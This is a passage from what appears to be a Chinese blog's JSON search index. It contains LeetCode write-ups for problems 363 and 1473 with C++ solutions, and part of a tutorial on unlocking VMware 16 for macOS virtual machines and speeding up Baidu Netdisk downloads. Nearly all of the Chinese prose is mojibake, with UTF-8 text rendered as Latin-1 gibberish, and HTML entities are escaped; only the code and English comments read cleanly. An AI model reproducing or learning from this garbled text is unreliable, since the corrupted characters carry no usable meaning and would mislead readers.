çš„åŒºé—´å’Œå‘¢ï¼Ÿ\nåŒºé—´å’Œä¸è¶…è¿‡ k ï¼Œè½¬åŒ–ä¸ºå…¬å¼å¦‚ä¸‹ï¼š\nå¯¹äºåŒºé—´ s ã€åŒºé—´å³ç«¯ r å’ŒåŒºé—´å·¦ç«¯ l ï¼Œä½¿å¾— prefix_sum[r] - prefix_sum[l - 1] \u0026lt;= k ã€‚\næˆ‘ä»¬ä½¿ç”¨äº†å‰ç¼€å’Œ prefix_sum ï¼Œä¸”åŒºé—´å·¦å³éƒ½æ˜¯é—­åˆçš„ã€‚\nåœ¨æœ¬é¢˜ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä»å·¦å‘å³éå†ï¼Œè®¡ç®—å‡ºæ–°çš„å‰ç¼€å’Œ prefix_sum[r] ï¼ŒåŒæ—¶ï¼Œæˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ª æœ‰åºé›†åˆ ä¿å­˜ä»¥å‰è®¡ç®—è¿‡çš„æ‰€æœ‰å‰ç¼€å’Œå³ prefix_sum[0 ~ l] ï¼Œä»é›†åˆä¸­å¿«é€ŸæŸ¥æ‰¾æ˜¯å¦å­˜åœ¨ä¸€ä¸ªå…ƒç´ æ»¡è¶³ä¸Šé¢çš„å¼å­å³å¯ã€‚\nè¯´åˆ°æœ‰åºé›†åˆï¼Œä¸å¾—ä¸æ set ï¼ŒåŸå¼å¯ä»¥å˜åŒ–ä¸º prefix_sum[l - 1] \u0026gt;= prefix_sum[r] - k ï¼Œå³æˆ‘ä»¬è¦æ‰¾çš„å…ƒç´ æ­£æ˜¯ set.lower_bound(prefix_sum[r] - k) ã€‚\nACä»£ç  class Solution { public: int maxSumSubmatrix(vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; matrix, int k) { int upper, lower; int row = matrix.size(); int col = matrix[0].size(); int ans = INT_MIN; for (upper = 0; upper \u0026lt; row; upper++) { vector\u0026lt;int\u0026gt; col_sum(col); for (lower = upper; lower \u0026lt; row; lower++) { for (int c = 0; c \u0026lt; col; c++) { col_sum[c] += matrix[lower][c]; } int right = 0; set\u0026lt;int\u0026gt; s = { 0 }; set\u0026lt;int\u0026gt;::iterator left; // for each right-pos for (int r = 0; r \u0026lt; col; r++) { // right --\u0026gt; prefix_sum[r] right += col_sum[r]; // right - left \u0026lt;= k // left \u0026gt;= right - k left = s.lower_bound(right - k); if (left != s.end()) { ans = max(ans, right - *left); } s.insert(right); } } } return ans; } }; åœ¨ä¸Šé¢çš„ä»£ç ä¸­ï¼Œæ³¨æ„ï¼š\næ¯åˆ—çš„å’Œ col_sum æ˜¯å›ºå®šäº†ä¸Šè¾¹ç•Œä¹‹åæ‰å¼€å§‹è®¡ç®—çš„ï¼Œæ•…å˜é‡å®šä¹‰åœ¨ç¬¬ä¸€å±‚å¾ªç¯å†…ï¼› æœ‰åºé›†åˆåˆå§‹éœ€è¦ä¸€ä¸ª 0 ï¼Œå¦åˆ™è®¡ç®—å‰ç¼€å’Œçš„æ—¶å€™æ— æ³•è€ƒè™‘ prefix_sum[r] æœ¬èº«ï¼› Performance å‚è€ƒèµ„æ–™ [1] åŠ›æ‰£å®˜æ–¹é¢˜è§£.çŸ©å½¢åŒºåŸŸä¸è¶…è¿‡ K çš„æœ€å¤§æ•°å€¼å’Œ[EB/OL].2021-04-21\nhttps://leetcode-cn.com/problems/max-sum-of-rectangle-no-larger-than-k/solution/ju-xing-qu-yu-bu-chao-guo-k-de-zui-da-sh-70q2/\n","date":"2021-05-07T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode363.-%E7%9F%A9%E5%BD%A2%E5%8C%BA%E5%9F%9F%E4%B8%8D%E8%B6%85%E8%BF%87-k-%E7%9A%84%E6%9C%80%E5%A4%A7%E6%95%B0%E5%80%BC%E5%92%8C/","title":"éš¾é¢˜æœ¬ | LeetCode363. çŸ©å½¢åŒºåŸŸä¸è¶…è¿‡ K çš„æœ€å¤§æ•°å€¼å’Œ"},{"content":"æ„‰å¿«çš„äº”å››é’å¹´èŠ‚ä»é‡åˆ°ä¸€é“Hardçš„åŠ¨æ€è§„åˆ’é¢˜ç»“æŸ~\né¢˜ç›®é“¾æ¥ï¼š1473. ç²‰åˆ·æˆ¿å­ III - åŠ›æ‰£ï¼ˆLeetCodeï¼‰ (leetcode-cn.com)\né¢˜ç›® åœ¨ä¸€ä¸ªå°åŸå¸‚é‡Œï¼Œæœ‰ m ä¸ªæˆ¿å­æ’æˆä¸€æ’ï¼Œä½ éœ€è¦ç»™æ¯ä¸ªæˆ¿å­æ¶‚ä¸Š n ç§é¢œè‰²ä¹‹ä¸€ï¼ˆé¢œè‰²ç¼–å·ä¸º 1 åˆ° n ï¼‰ã€‚æœ‰çš„æˆ¿å­å»å¹´å¤å¤©å·²ç»æ¶‚è¿‡é¢œè‰²äº†ï¼Œæ‰€ä»¥è¿™äº›æˆ¿å­ä¸éœ€è¦è¢«é‡æ–°æ¶‚è‰²ã€‚\næˆ‘ä»¬å°†è¿ç»­ç›¸åŒé¢œè‰²å°½å¯èƒ½å¤šçš„æˆ¿å­ç§°ä¸ºä¸€ä¸ªè¡—åŒºã€‚ï¼ˆæ¯”æ–¹è¯´ houses = [1,2,2,3,3,2,1,1] ï¼Œå®ƒåŒ…å« 5 ä¸ªè¡—åŒº [{1}, {2,2}, {3,3}, {2}, {1,1}] ã€‚ï¼‰\nç»™ä½ ä¸€ä¸ªæ•°ç»„ houses ï¼Œä¸€ä¸ª m * n çš„çŸ©é˜µ cost å’Œä¸€ä¸ªæ•´æ•° target ï¼Œå…¶ä¸­ï¼š\nhouses[i]ï¼šæ˜¯ç¬¬ i ä¸ªæˆ¿å­çš„é¢œè‰²ï¼Œ0 è¡¨ç¤ºè¿™ä¸ªæˆ¿å­è¿˜æ²¡æœ‰è¢«æ¶‚è‰²ã€‚ cost[i][j]ï¼šæ˜¯å°†ç¬¬ i ä¸ªæˆ¿å­æ¶‚æˆé¢œè‰² j+1 çš„èŠ±è´¹ã€‚ è¯·ä½ è¿”å›æˆ¿å­æ¶‚è‰²æ–¹æ¡ˆçš„æœ€å°æ€»èŠ±è´¹ï¼Œä½¿å¾—æ¯ä¸ªæˆ¿å­éƒ½è¢«æ¶‚è‰²åï¼Œæ°å¥½ç»„æˆ target ä¸ªè¡—åŒºã€‚å¦‚æœæ²¡æœ‰å¯ç”¨çš„æ¶‚è‰²æ–¹æ¡ˆï¼Œè¯·è¿”å› -1 ã€‚\nç¤ºä¾‹1\nè¾“å…¥ï¼š houses = [0,0,0,0,0], cost = [[1,10],[10,1],[10,1],[1,10],[5,1]], m = 5, n = 2, target = 3 è¾“å‡ºï¼š 9 è§£é‡Šï¼š æˆ¿å­æ¶‚è‰²æ–¹æ¡ˆä¸º [1,2,2,1,1]ï¼Œæ­¤æ–¹æ¡ˆåŒ…å« target = 3 ä¸ªè¡—åŒºï¼Œåˆ†åˆ«æ˜¯ [{1}, {2,2}, {1,1}]ã€‚æ¶‚è‰²çš„æ€»èŠ±è´¹ä¸º (1 + 1 + 1 + 1 + 5) = 9ã€‚ ç¤ºä¾‹2:\nè¾“å…¥ï¼š houses = [0,2,1,2,0], cost = [[1,10],[10,1],[10,1],[1,10],[5,1]], m = 5, n = 2, target = 3 è¾“å‡ºï¼š 11 è§£é‡Šï¼š æœ‰çš„æˆ¿å­å·²ç»è¢«æ¶‚è‰²äº†ï¼Œåœ¨æ­¤åŸºç¡€ä¸Šæ¶‚è‰²æ–¹æ¡ˆä¸º [2,2,1,2,2]ï¼Œæ­¤æ–¹æ¡ˆåŒ…å« target = 3 ä¸ªè¡—åŒºï¼Œåˆ†åˆ«æ˜¯ [{2,2}, {1}, {2,2}]ã€‚ç»™ç¬¬ä¸€ä¸ªå’Œæœ€åä¸€ä¸ªæˆ¿å­æ¶‚è‰²çš„èŠ±è´¹ä¸º (10 + 1) = 11ã€‚ æ•°æ®èŒƒå›´\nm == houses.length == cost.length n == cost[i].length 1 \u0026lt;= m \u0026lt;= 100 1 \u0026lt;= n \u0026lt;= 20 1 \u0026lt;= target \u0026lt;= m 0 \u0026lt;= houses[i] \u0026lt;= n 1 \u0026lt;= cost[i][j] \u0026lt;= 10^4 åˆ†æ åˆæ˜¯ä¸€é“å…¨æ— æ€è·¯çš„é¢˜ç›®ã€‚\næ˜¾ç„¶æœ¬é¢˜éœ€è¦ä½¿ç”¨åŠ¨æ€è§„åˆ’ï¼ŒæŸ¥çœ‹æç¤ºï¼Œå»ºè®®æˆ‘ä»¬ä½¿ç”¨ä¸€ä¸ªä¸‰ç»´æ•°ç»„ dp[i][j][k] ï¼Œå…¶ä¸­ i è¡¨ç¤ºå½“å‰æˆ¿å­çš„ä¸‹æ ‡ï¼Œ j è¡¨ç¤ºå½“å‰æˆ¿å­åº”è¯¥ä¸Šçš„é¢œè‰²ï¼Œ k è¡¨ç¤ºç®—ä¸Šå½“å‰çš„æˆ¿å­ä¸€å…±æœ‰å¤šå°‘è¡—åŒºã€‚ dp[i][j][k] è¡¨ç¤ºæ‰€éœ€çš„æœ€å°‘èŠ±è´¹ã€‚\næˆ‘ä»¬ä¸å‚è€ƒæ–‡ç«  [1] ä½¿ç”¨ç›¸åŒçš„åŠæ³•æ¥å¯¹è¿™äº›ä¸‹æ ‡è¿›è¡Œè¡¨ç¤ºï¼š\næˆ¿å±‹ç¼–å·ä» 0 ~ m - 1 é¢œè‰²ç¼–å·ä» 0 ~ n - 1 è¡—åŒºç¼–å·ä» 0 ~ target - 1 å¯¹åº”é¢œè‰²ç¼–å·ï¼Œ houses æ•°ç»„çš„å€¼å…¨éƒ¨ å‡ä¸€ ï¼Œåˆ™ ä½¿ç”¨ -1 æ¥è¡¨ç¤ºåŸæœ¬æ²¡æœ‰ä¸Šè‰²çš„æˆ¿å­ ã€‚ å·²ç»ç»™å®šäº†è¿™äº›æ•°æ®å’Œä¸‹æ ‡çš„å«ä¹‰ä¹‹åï¼Œå†æ¥è¿›è¡Œæ€è€ƒå°±æ¯”è¾ƒç®€å•äº†ã€‚ä½¿ç”¨æœ¬æ–‡çš„ä»£ç æ¥è¿›è¡Œåˆ†æï¼Œå¯¹äºä¸‹æ ‡ idx çš„æˆ¿å­ä»¥åŠå®ƒè¢«åˆ·ä¸Šçš„é¢œè‰² color å’Œç°åœ¨å·²æœ‰çš„è¡—åŒºæ•° district ï¼Œæˆ‘ä»¬å‘ç° dp[idx][color][district] çš„æ•°å€¼åº”è¯¥å–å†³äºå½“å‰æˆ¿å±‹ å’Œä¸Šä¸€é—´æˆ¿å±‹ çš„é¢œè‰²ï¼Œå‡å¦‚ï¼š\nå½“å‰æˆ¿å±‹çš„é¢œè‰²å’Œä¸Šä¸€é—´æˆ¿å±‹çš„é¢œè‰² j0 ç›¸åŒï¼Œè¡—åŒºæ•°é‡ä¸ä¼šå˜åŒ–ï¼Œåˆ™ dp[idx][color][district] == dp[idx - 1][color][district] ï¼› å½“å‰æˆ¿å±‹é¢œè‰²å’Œä¸Šä¸€é—´æˆ¿å±‹çš„é¢œè‰² j0 ä¸åŒï¼Œè¡—åŒºæ•°é‡åº”è¯¥åŠ ä¸€ï¼Œåˆ™ dp[idx][color][district] == dp[idx - 1][j0][district - 1] ï¼› å½“ç„¶ï¼Œæˆ¿å­åŸæœ¬çš„é¢œè‰²ä¹Ÿä¼šå½±å“ dp å€¼çš„å˜åŒ–ï¼Œå…·ä½“å®é™…ä¸Šåªæœ‰ä¸¤æ–¹é¢ï¼š\næˆ¿å­åŸæœ¬æ²¡æœ‰é¢œè‰²ï¼Œå³æŒ‰ç…§ä¸Šé¢çš„è§„åˆ™ houses[idx] == -1 ï¼Œé‚£ä¹ˆä¸Šé¢å¾—åˆ°çš„ dp å€¼å…¨éƒ½è¦åŠ ä¸Š cost[idx][color] ï¼› æˆ¿å­åŸæœ¬æœ‰é¢œè‰²ï¼Œå¦‚æœæ­¤é¢œè‰²ä¸ color ä¸åŒï¼Œé‚£ä¹ˆè¿™ç§ä¸Šè‰²æ–¹æ¡ˆæ— è®ºå¦‚ä½•æ˜¯ä¸å¯è¡Œçš„ï¼›å¦‚æœæ­¤é¢œè‰²ä¸ color ç›¸åŒï¼Œé‚£ä¹ˆ dp å€¼å°±æ˜¯æˆ‘ä»¬ä¸Šé¢åˆ†æçš„æƒ…å†µã€‚ æŠŠè¿™äº›åˆ†æåŠ ä»¥å®ç°ï¼Œæˆ‘ä»¬åº”è¯¥ï¼š\n- æšä¸¾æˆ¿å­ä¸‹æ ‡ --\u0026gt; idx: 0 ~ m - 1\r- æšä¸¾ä¸Šè‰²æ–¹æ¡ˆ --\u0026gt; color: 0 ~ n - 1\r- å¦‚æœæˆ¿å­æœ‰é¢œè‰²ä¸”ä¸åŒäº colorï¼Œç»§ç»­æšä¸¾é¢œè‰²\r- è¿è¡Œè‡³æ­¤æœ‰ä¸¤ç§æƒ…å†µï¼šæˆ¿å­æ²¡æœ‰é¢œè‰²ï¼Œæˆ–æˆ¿å­æœ‰é¢œè‰²ä¸”é¢œè‰²å°±æ˜¯ color\r- å¦‚æœæˆ¿å­ä¸‹æ ‡ idx æ˜¯ 0ï¼Œ æ„å‘³ç€æ²¡æœ‰ä¸Šä¸€ä¸ªæˆ¿å­ï¼Œdp[idx][color][0] = houses[idx] == -1 ? cost[0][color] : 0;ç»§ç»­æšä¸¾é¢œè‰²\r- å¦åˆ™å¼€å§‹æšä¸¾è¡—åŒº --\u0026gt; district: 0 ~ target - 1\r- æšä¸¾ä¸Šä¸€é—´æˆ¿å­çš„é¢œè‰² --\u0026gt; j0: 0 ~ n - 1\r- å¦‚æœä¸Šä¸€é—´æˆ¿å­çš„é¢œè‰²å’Œç°åœ¨çš„é¢œè‰²ç›¸åŒï¼Œè®¾ç½® dp å€¼ // [1]\r- å¦‚æœä¸Šä¸€é—´æˆ¿å­çš„é¢œè‰²å’Œç°åœ¨çš„é¢œè‰²ä¸åŒï¼Œè®¾ç½® dp å€¼ // [2]\r- å¦‚æœæˆ¿å­åŸæœ¬æ²¡æœ‰é¢œè‰²ï¼Œå¾—åˆ°çš„ dp[idx][color][district] è¦åŠ ä¸Š cost[idx][color] æ ¹æ®ä¸Šé¢çš„å®ç°æ¥å†™ä»£ç ï¼Œåº”è¯¥è¦æ³¨æ„å‡ ä¸ªè¦ç‚¹ï¼š\nåœ¨ä¼ªä»£ç  [1] å’Œ [2] å¤„ï¼Œç”±äºæˆ‘ä»¬åœ¨è¿›è¡Œä¸Šä¸€é—´æˆ¿å­é¢œè‰²çš„æšä¸¾ï¼Œä¸èƒ½ç®€å•åœ°è®¾ç½® dp[idx][color][district] == dp[idx - 1][j0][district] ï¼Œè€Œæ˜¯åº”è¯¥æ ¹æ® dp çš„å®šä¹‰ï¼Œå–å…¶ä¸­çš„æœ€å°å€¼ï¼Œå³ACä»£ç ä¸­æ‰€åšçš„å– min ã€‚ ç”±äºæˆ‘ä»¬æšä¸¾çš„è¡—åŒº district ä» 0 å¼€å§‹ï¼Œå¯¹äºå½“å‰æˆ¿å±‹å’Œä¸Šä¸€é—´æˆ¿å±‹é¢œè‰²ä¸åŒçš„æƒ…å†µï¼Œéœ€è¦åˆ¤æ–­è¡—åŒºæ•°å¤§äº 0 æ‰æœ‰æ„ä¹‰ã€‚ æ³¨æ„ cost[idx] æ·»åŠ çš„ä½ç½®ï¼Œæšä¸¾å®Œä¸Šä¸€é—´æˆ¿å­çš„é¢œè‰²ä¹‹åå°±è¿›è¡Œæ·»åŠ ï¼Œå› ä¸ºå¯¹äºæ‰€æœ‰çš„ district éƒ½è¦è€ƒè™‘è¿™ä¸€æƒ…å†µã€‚ æˆ‘ä»¬å¦‚ä½•è¡¨ç¤º dp çš„åˆå§‹å€¼ï¼šç”±äºéšæ—¶å¯èƒ½åœ¨ä¸€ä¸ªæœªè¢«ä¿®æ”¹çš„ dp ä¸ŠåŠ ä¸Šæˆ‘ä»¬çš„ cost ï¼Œé‚£ä¹ˆå®ƒçš„åˆå§‹å€¼å°±ä¸èƒ½è®¾ç½®å¾—å¤ªå¤§ï¼Œåœ¨å…·ä½“å®ç°ä¸­ï¼Œæˆ‘ä»¬é‡æ–°å®šä¹‰äº†ä¸€ä¸‹ INT_MAX ã€‚ ACä»£ç  class Solution { public: #undef INT_MAX #define INT_MAX 0x3f3f3f3f // #define DEBUG int minCost(vector\u0026lt;int\u0026gt;\u0026amp; houses, vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026amp; cost, int m, int n, int target) { int idx, color, district; vector\u0026lt;vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;\u0026gt; dp(m, vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt;(n, vector\u0026lt;int\u0026gt;(target, INT_MAX))); for (int\u0026amp; hc : houses) { hc--; } for (idx = 0; idx \u0026lt; m; idx++) { for (color = 0; color \u0026lt; n; color++) { // this color can not be applied if (houses[idx] != -1 \u0026amp;\u0026amp; houses[idx] != color) continue; if (idx == 0) { dp[idx][color][0] = houses[idx] == -1 ? cost[0][color] : 0; continue; } // enum districts for (district = 0; district \u0026lt; target; district++) { // enum the color of house[idx - 1] !! for (int j0 = 0; j0 \u0026lt; n; j0++) { // same color if (j0 == color) { // the district will not change dp[idx][color][district] = min(dp[idx][color][district], dp[idx - 1][j0][district]); } else { if (district) dp[idx][color][district] = min(dp[idx][color][district], dp[idx - 1][j0][district - 1]); } } if (houses[idx] == -1) { dp[idx][color][district] += cost[idx][color]; } } } } # ifdef DEBUG for (idx = 0; idx \u0026lt; m; idx++) { cout \u0026lt;\u0026lt; \u0026#34;House \u0026#34; \u0026lt;\u0026lt; idx \u0026lt;\u0026lt; endl; for (color = 0; color \u0026lt; n; color++) { cout \u0026lt;\u0026lt; \u0026#39;\\t\u0026#39; \u0026lt;\u0026lt; \u0026#34;Color \u0026#34; \u0026lt;\u0026lt; color \u0026lt;\u0026lt; endl; for (district = 0; district \u0026lt; target; district++) { cout \u0026lt;\u0026lt; \u0026#34;\\t\\t\u0026#34; \u0026lt;\u0026lt; dp[idx][color][district] \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } cout \u0026lt;\u0026lt; endl; } } #endif int ans = INT_MAX; for (color = 0; color \u0026lt; n; color++) { ans = min(ans, dp[m - 1][color][target - 1]); } if (ans == INT_MAX) return -1; else return ans; } }; Performance å‚è€ƒæ–‡ç«  [1] åŠ›æ‰£å®˜æ–¹é¢˜è§£.ç²‰åˆ·æˆ¿å­ III[EB/OL].2021-05-02\nhttps://leetcode-cn.com/problems/paint-house-iii/solution/fen-shua-fang-zi-iii-by-leetcode-solutio-powb/\n[2] å®«æ°´ä¸‰å¶.ã€å®«æ°´ä¸‰å¶ã€‘ä¸‰ç»´åŠ¨æ€è§„åˆ’ï¼Œä»¥åŠå…¶ã€ŒçŠ¶æ€å®šä¹‰ã€ç”±æ¥[EB/OL].2020-05-04\nhttps://leetcode-cn.com/problems/paint-house-iii/solution/gong-shui-san-xie-san-wei-dong-tai-gui-h-ud7m/\n","date":"2021-05-04T00:00:00Z","permalink":"https://xrg.fj.cn/p/%E9%9A%BE%E9%A2%98%E6%9C%AC-leetcode1473.-%E7%B2%89%E5%88%B7%E6%88%BF%E5%AD%90-iii/","title":"éš¾é¢˜æœ¬ | LeetCode1473. ç²‰åˆ·æˆ¿å­ III"},{"content":"å¦‚æœä½ å•çº¯åœ°æƒ³ä½“éªŒä¸€ä¸‹ä»¥â€œç®€æ´é«˜æ•ˆâ€œé—»åçš„Mac OSï¼Œé‚£ä¹ˆæˆ‘ä¼šå¼ºçƒˆæ¨èä½ ä¸ºè‡ªå·±åˆ›å»ºä¸€å°Mac OSçš„è™šæ‹Ÿæœºï¼Œä½¿ç”¨è¿™ç§æ–¹æ³•ï¼Œä½ ä¸éœ€è¦èŠ±è´¹å¤§å‡ åƒå…ƒå»è´­å…¥ä¸€å°Mac Bookï¼Œå°±èƒ½å¾—åˆ°æœ€å®Œæ•´çš„ç³»ç»Ÿä½“éªŒã€‚å½“ç„¶ï¼Œå‡è‹¥ä½ åœ¨ä½“éªŒä¹‹åçˆ±ä¸Šäº†è¿™æ¬¾ç³»ç»Ÿï¼Œä¹‹ååŠªåŠ›å·¥ä½œä¸ºè‡ªå·±çš„æƒ…æ€€ä¹°ä¸ªå•ä¹Ÿæ˜¯æœ‰æ‰€å¿…è¦çš„ã€‚\nè§£é”VMWare æˆ‘ä»¬è¯¸å¤šæ­¥éª¤ä¸­æœ€å›°éš¾çš„ä¸€æ­¥å°±æ˜¯è§£é”VMWareäº†ã€‚ä¸ºä»€ä¹ˆå«è§£é”å‘¢ï¼Ÿå› ä¸ºæˆ‘ä»¬ä½¿ç”¨çš„ç¨‹åºè¢«ä½œè€…å‘½åä¸º unlocker ï¼Œå°±è¿™ä¹ˆç®€å•Â·Â·Â·Â·Â·Â· æˆ‘å‡å®šé˜…è¯»æœ¬æ–‡çš„è¯»è€…å·²ç»çŸ¥é“ä»€ä¹ˆæ˜¯VMWareï¼Œå¹¶ä¸”åˆ›å»ºè¿‡è‡ªå·±çš„è™šæ‹Ÿæœºï¼Œå¯¹äºVMWareçš„å®‰è£…ç­‰æµç¨‹ä¸å†èµ˜è¿°ã€‚æœ¬æ–‡ä½¿ç”¨çš„æ˜¯VMWare Workstation Pro 16 ã€‚\næ­£å¸¸çš„VMWareåœ¨åˆ›å»ºè™šæ‹Ÿæœºçš„æ—¶å€™ï¼Œéœ€è¦é€‰æ‹©è™šæ‹Ÿæœºæ“ä½œç³»ç»Ÿï¼Œè€Œä¸”åªæœ‰ç®€å•çš„å‡ ä¸ªé€‰é¡¹ï¼ˆWindows/Linux/Â·Â·Â·ï¼‰ã€‚æˆ‘ä»¬åœ¨é€‰é¡¹åˆ—è¡¨ä¸­çœ‹ä¸åˆ° apple MacOS è¿™ç±»çš„å­—çœ¼ï¼Œå› æ­¤æˆ‘ä»¬è¦åšçš„ç¬¬ä¸€ä»¶äº‹å°±æ˜¯è®©VMWareèƒ½å¤Ÿåˆ›å»º Mac OS ç±»å‹çš„è™šæ‹Ÿæœºã€‚ è¿™ä¸€æ­¥çœŸæ˜¯éå¸¸çš„ç®€å•å•Šã€‚æ€»ä½“è€Œè¨€ï¼Œæˆ‘ä»¬åªéœ€è¦è¿›è¡Œä¸‰ä¸ªæ­¥éª¤ï¼š\nä¸‹è½½ unlocker è½¯ä»¶ è½¯ä»¶è¿è¡Œä¹‹å‰åšä¸€äº›å‰æœŸçš„å‡†å¤‡ è¿è¡Œï¼ Amazingï¼Œçœ‹èµ·æ¥ä¸€ç‚¹éƒ½ä¸éš¾å§ï¼Ÿ\nStep1 æˆ‘ä»¬å» è¿™ä¸ªç½‘å€ ä¸‹è½½æ‰€éœ€è¦çš„è½¯ä»¶ã€‚\nå¯¹åº”äºæœ¬æ–‡æ‰€ä½¿ç”¨çš„VMWare 16ï¼Œä½ å¯ä»¥æœ‰ä¸¤ç§é€‰æ‹©ï¼š\nAuto-Unlocker v1.1.3 ä»¥ä¸€ä¸ª exe çš„å½¢å¼å°è£…å¥½äº†æ‰€æœ‰çš„æµç¨‹ï¼Œåœ¨æˆ‘çš„æµ‹è¯•ä¸­ï¼Œè¿™ä¸ªè½¯ä»¶æ€»æ˜¯ä¸èƒ½æˆåŠŸè§£é”VMWareï¼Œä»¤äººç”Ÿæ°”ã€‚ æ ¹æ®æŸä¸ª issue ä¸­çš„åŠæ³•ï¼Œå» è¿™é‡Œ ä¸‹è½½å¦ä¸€ä¸ªç‰ˆæœ¬çš„ unlocker ï¼Œå…„å¼Ÿï¼Œè¿™ä¸ªåŠæ³•çœŸçš„ç®¡ç”¨ï¼ ä½¿ç”¨ç¬¬äºŒä¸ªåŠæ³•ï¼Œä¸‹è½½çš„æ–‡ä»¶è§£å‹ä¹‹åå¤§æ¦‚æ˜¯è¿™æ ·çš„ï¼š unlocker files ç›¸ä¿¡ä½ èƒ½è‡ªå·±æ‰¾åˆ° win-install.cmd è¿™ä¸ªæ–‡ä»¶ï¼Œå¯¹å§ï¼Ÿ\nStep2 ç°åœ¨å…ˆä¸è¦æ€¥ç€è¿è¡Œï¼Œæˆ‘ä»¬éœ€è¦åšä¸€äº›è¿è¡Œä¹‹å‰çš„å‡†å¤‡ã€‚\næ‰“å¼€ä»»åŠ¡ç®¡ç†å™¨ï¼Œé¦–å…ˆæ€æ‰è·ŸVMWareæœ‰å…³çš„è¿›ç¨‹ï¼Œå®ƒä»¬ä¸€èˆ¬éƒ½ä»¥ VM- è¿™æ ·çš„æ ¼å¼å¼€å¤´ã€‚\nç„¶åè¿›å…¥åˆ°ä»»åŠ¡ç®¡ç†å™¨çš„ã€æœåŠ¡ã€‘é¢æ¿ï¼Œåœæ­¢è·ŸVMWareæœ‰å…³çš„æœåŠ¡ï¼Œå¦‚ VMNetDHCP ç­‰ï¼Œå®ƒä»¬çš„æ ¼å¼ä¹Ÿéƒ½ä»¥ VM- å¼€å¤´ã€‚\nä¸ç”¨æ‹…å¿ƒæœåŠ¡æ²¡æœ‰å…³å¹²å‡€ï¼Œæˆ–è€…è¿›ç¨‹æ€ä¸æ‰çš„é—®é¢˜ã€‚ç†è®ºä¸Šæˆ‘ä»¬çš„ unlocker èƒ½å¤Ÿè‡ªåŠ¨å…³æ‰è¿™äº›æœåŠ¡ï¼Œç­‰åˆ°è§£é”å®Œæ¯•ä¹‹åå†å¯åŠ¨å®ƒä»¬ã€‚æˆ‘åœ¨è¿™é‡Œå•°å—¦è¿™äº›ï¼Œä¸»è¦æ˜¯å¿ å®åœ°è®°å½•æˆ‘çš„å®è·µç»“æœï¼Œå¦‚æœä½ è¿æ°”å¥½çš„è¯ï¼Œè·³è¿‡è¿™ä¸€æ­¥æœ€ç»ˆä¹Ÿæ˜¯å¯èƒ½æˆåŠŸçš„ã€‚\nStep3 ä¸‡äº‹ä¿±å¤‡ï¼Œæˆ‘ä»¬å³é”®é‚£ä¸ª win-install.cmd ï¼Œä»¥ç®¡ç†å‘˜èº«ä»½è¿è¡Œï¼Œç­‰å®ƒè¿è¡Œå®Œæ¯•äº†ï¼Œä½ çš„VMWareåº”è¯¥å°±æ”¯æŒ Mac OS äº†ï¼ New option Qï¼šVMWare 16ï¼ŒæŒ‰ç…§ä¸Šé¢çš„æµç¨‹èµ°ï¼Œæ²¡æœ‰æ•ˆæœæ€ä¹ˆåŠï¼Ÿ Aï¼šé¦–å…ˆå¯ä»¥å°è¯•ä½¿ç”¨ VMWare installer è¿›è¡Œä¸€ä¸ª repair çš„æ“ä½œï¼Œä¹Ÿå°±æ˜¯ä¿®å¤VMWareçš„å®‰è£…äº†ã€‚å¦‚æœè¿™ä¸€æ­¥è¿˜ä¸è¡Œçš„è¯ï¼Œå¯ä»¥è¯•è¯•å…¶ä»–ç‰ˆæœ¬çš„ unlocker ã€‚ ä¸‹è½½Mac OSé•œåƒ è¿™ä¸€æ­¥å¯å°±å‰å®³äº†ï¼æˆ‘ä¸ä¼šå‘ä½ åˆ†äº«é•œåƒçš„é“¾æ¥ï¼ˆç½‘ä¸Šå¤šçš„å¾ˆï¼‰ï¼Œä½†æ˜¯æˆ‘è¦å‘Šè¯‰ä½ æ€ä¹ˆçªç ´ç™¾åº¦ç½‘ç›˜çš„é™é€Ÿï¼ æ€»çš„æ¥è¯´ï¼Œè¿˜æ˜¯åˆ†æˆ3ä¸ªæ­¥éª¤ï¼š\nä¸‹è½½IDM\nä¸‹è½½å¹¶å®‰è£…Temper Monkey\nä¸‹è½½ç›´é“¾åŠ©æ‰‹æ’ä»¶ï¼Œè·å–ç›´é“¾è¿›è¡Œä¸‹è½½\nä¸‹è½½IDM IDMï¼ˆInternet Download Managerï¼‰æ˜¯ä¸€ä¸ªå¤šçº¿ç¨‹ä¸‹è½½å™¨ï¼Œå…·ä½“çš„åŸç†å¤§æ¦‚å°±æ˜¯é¢å¯¹ä¸€ä¸ªå¤§æ–‡ä»¶æ—¶ï¼Œæ¯ä¸€ä¸ªçº¿ç¨‹ä»ä¸åŒçš„èµ·ç‚¹å¼€å§‹ä¸‹è½½ï¼Œæœ€ç»ˆæŠŠæ¯ä¸ªçº¿ç¨‹ä¸‹è½½çš„å¤šä¸ªæ¨¡å—è¿˜åŸæˆåŸæœ¬çš„æ–‡ä»¶ã€‚å½“ç„¶ï¼Œæˆ‘ä»¬ä¸éœ€è¦æ·±å…¥æ¢æŸ¥å®ƒçš„å®ç°æ–¹å¼ï¼Œåªéœ€è¦å» è¿™ä¸ªåœ°æ–¹ ä¸‹è½½è½¯ä»¶å°±å¥½äº†ï¼ å®‰è£…è½¯ä»¶çš„è¿‡ç¨‹å°±ä¸å¤šè¯´äº†ï¼Œæ®è¯´Edgeæµè§ˆå™¨ä¹Ÿå¯ä»¥é›†æˆIDMæ’ä»¶ï¼Œä½†æ˜¯åœ¨æˆ‘çš„å®è·µä¸­å¥½åƒå¹¶æ²¡æœ‰ç”¨åˆ°å®ƒã€‚\n2022-05-28æ›´æ–°\nç©è¿‡é»‘è‹¹æœä¹‹åï¼Œæ²¡æƒ³åˆ°æœ‰ä¸€å¤©åˆå›åˆ°äº†è™šæ‹Ÿæœºçš„æ€€æŠ± ğŸ¤£\næˆ‘çš„ Yoga 13s æ²¡æœ‰ç›¸åº”çš„Hackintoshæ•™ç¨‹ï¼Œä¸ºäº†ç»§ç»­æˆ‘çš„Mac 